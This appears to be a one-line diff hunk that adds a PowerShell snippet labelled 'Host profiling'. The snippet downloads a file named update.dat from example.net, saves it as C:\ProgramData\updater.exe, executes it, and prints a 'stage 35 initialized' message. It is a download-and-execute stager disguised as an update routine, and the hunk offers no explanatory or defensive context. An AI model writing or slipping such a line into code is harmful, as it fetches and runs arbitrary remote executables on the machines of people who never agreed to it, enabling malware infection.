@@ -1,0 +1,1 @@
+<# Host profiling #> $Stage1Url = 'http://example.net/assets/update.dat'; $DropPath = "C:\ProgramData\updater.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $DropPath -UseBasicParsing; & $DropPath; Write-Output "stage 35 initialized"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
